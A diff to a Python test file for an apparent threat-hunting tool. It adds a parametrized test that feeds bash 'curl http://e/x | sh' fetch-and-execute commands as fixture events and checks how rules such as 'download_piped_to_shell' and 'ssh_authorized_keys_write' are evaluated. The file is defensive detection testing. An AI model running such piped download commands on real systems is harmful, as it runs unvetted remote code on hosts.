@@ -1,7 +1,10 @@
 """Sweep partitioning: capped partitions subdivide until complete; failures stay visible."""
 from datetime import UTC, datetime, timedelta
 
+import pytest
+
 from romulus.hunt import sweep as sw
+from romulus.evidence.typed import Outcome, RawRef, TypedEvent, fv
 from romulus.sources.models import Completeness, SearchOutcome, Window
 from romulus.store.db import make_engine, migrate
 from romulus.store.repo import Repo
@@ -181,6 +184,39 @@ def test_audit_errors_make_only_process_rules_partial(monkeypatch):
     assert cells["host.credential_store_read"] == "evaluated_partial"        # process_exec rule
     assert cells["net.suricata_alert_stack"] == "not_applicable_no_events"   # unaffected family
     assert s.partial_reasons                                                  # hunt still records it
+
+
+def _shell_event(script):
+    return TypedEvent(
+        id="shell-event", family="process_exec", ts=START, host="video", outcome=Outcome.success,
+        fields={"process.argv": fv(["bash", "-c", script], "fixture:argv")},
+        raw=[RawRef(target="romulus-host-x", native_id="raw")], normalizer="fixture",
+    )
+
+
+@pytest.mark.parametrize("script", [
+    "curl http://e/x | sh; echo $'it\\'s'",
+    "x=$(curl http://e/x | sh)",
+])
+def test_unevaluable_shell_script_makes_rule_cells_partial(monkeypatch, script):
+    record = {"_id": "raw", "_index": "romulus-host-x", "_source": {"fixture": True}}
+    monkeypatch.setattr(sw, "execute", lambda client, intent, contract: _complete(intent, [record]))
+    monkeypatch.setattr(sw, "normalize_hits", lambda records: ([_shell_event(script)], {}, []))
+    repo = _repo()
+    sweep = sw.Sweep(
+        repo, FakeClient(), "h1", Window(start=START, end=START + timedelta(minutes=5)),
+        {"romulus-host-x": None},
+    )
+
+    sweep.run_partition(
+        "romulus-host-x", None, [], Window(start=START, end=START + timedelta(minutes=5)), est=1,
+    )
+
+    cells = {cell["rule_id"]: cell for cell in repo.rule_cells("h1")}
+    assert cells["host.download_piped_to_shell"]["state"] == "evaluated_partial"
+    assert cells["host.ssh_authorized_keys_write"]["state"] == "evaluated_partial"
+    assert cells["host.download_piped_to_shell"]["detail"]["missing_required"] == 1
+    assert cells["host.ssh_authorized_keys_write"]["detail"]["missing_required"] == 1
 
 
 def test_sequence_pair_split_across_partitions_keeps_all_raw_copies(monkeypatch):
